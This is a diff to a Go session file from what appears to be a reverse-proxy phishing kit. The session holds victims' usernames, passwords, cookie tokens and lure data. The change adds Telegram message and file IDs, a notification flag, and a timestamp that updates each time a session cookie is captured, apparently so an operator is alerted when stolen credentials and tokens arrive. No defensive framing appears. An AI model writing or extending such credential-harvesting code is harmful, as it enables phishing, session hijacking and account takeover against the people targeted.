@@ -7,51 +7,61 @@ import (
 )
 
 type Session struct {
-	Id             string
-	Name           string
-	Username       string
-	Password       string
-	Custom         map[string]string
-	Params         map[string]string
-	BodyTokens     map[string]string
-	HttpTokens     map[string]string
-	CookieTokens   map[string]map[string]*database.CookieToken
-	RedirectURL    string
-	IsDone         bool
-	IsAuthUrl      bool
-	IsForwarded    bool
-	ProgressIndex  int
-	RedirectCount  int
-	PhishLure      *Lure
-	RedirectorName string
-	LureDirPath    string
-	DoneSignal     chan struct{}
-	RemoteAddr     string
-	UserAgent      string
+	Id                 string
+	Name               string
+	Username           string
+	Password           string
+	Custom             map[string]string
+	Params             map[string]string
+	BodyTokens         map[string]string
+	HttpTokens         map[string]string
+	CookieTokens       map[string]map[string]*database.CookieToken
+	RedirectURL        string
+	IsDone             bool
+	IsAuthUrl          bool
+	IsForwarded        bool
+	ProgressIndex      int
+	RedirectCount      int
+	PhishLure          *Lure
+	RedirectorName     string
+	LureDirPath        string
+	DoneSignal         chan struct{}
+	RemoteAddr         string
+	UserAgent          string
+	// Telegram tracking fields
+	TelegramMessageID  int    // Telegram message ID for editing
+	TelegramFileID     string // Telegram file ID for updating JSON
+	TelegramNotified   bool   // Whether initial notification was sent
+	LastTokenUpdate    int64  // Unix timestamp of last token update
 }
 
 func NewSession(name string) (*Session, error) {
 	s := &Session{
-		Id:             GenRandomToken(),
-		Name:           name,
-		Username:       "",
-		Password:       "",
-		Custom:         make(map[string]string),
-		Params:         make(map[string]string),
-		BodyTokens:     make(map[string]string),
-		HttpTokens:     make(map[string]string),
-		RedirectURL:    "",
-		IsDone:         false,
-		IsAuthUrl:      false,
-		IsForwarded:    false,
-		ProgressIndex:  0,
-		RedirectCount:  0,
-		PhishLure:      nil,
-		RedirectorName: "",
-		LureDirPath:    "",
-		DoneSignal:     make(chan struct{}),
-		RemoteAddr:     "",
-		UserAgent:      "",
+		Id:                GenRandomToken(),
+		Name:              name,
+		Username:          "",
+		Password:          "",
+		Custom:            make(map[string]string),
+		Params:            make(map[string]string),
+		BodyTokens:        make(map[string]string),
+		HttpTokens:        make(map[string]string),
+		RedirectURL:       "",
+		IsDone:            false,
+		IsAuthUrl:         false,
+		IsForwarded:       false,
+		ProgressIndex:     0,
+		RedirectCount:     0,
+		PhishLure:         nil,
+		RedirectorName:    "",
+		LureDirPath:       "",
+		DoneSignal:        make(chan struct{}),
+		RemoteAddr:        "",
+		UserAgent:         "",
+		// Initialize Telegram tracking
+		TelegramMessageID: 0,
+		TelegramFileID:    "",
+		TelegramNotified:  false,
+		LastTokenUpdate:   0,
 	}
 	s.CookieTokens = make(map[string]map[string]*database.CookieToken)
 
@@ -88,6 +98,13 @@ func (s *Session) AddCookieAuthToken(domain string, key string, value string, pa
 		}
 	}
 
+	// Update token timestamp for Telegram notifications
+	s.LastTokenUpdate = time.Now().Unix()
+}
+
+// UpdateTokenTimestamp updates the last token update timestamp
+func (s *Session) UpdateTokenTimestamp() {
+	s.LastTokenUpdate = time.Now().Unix()
 }
 
 func (s *Session) AllCookieAuthTokensCaptured(authTokens map[string][]*CookieAuthToken) bool {
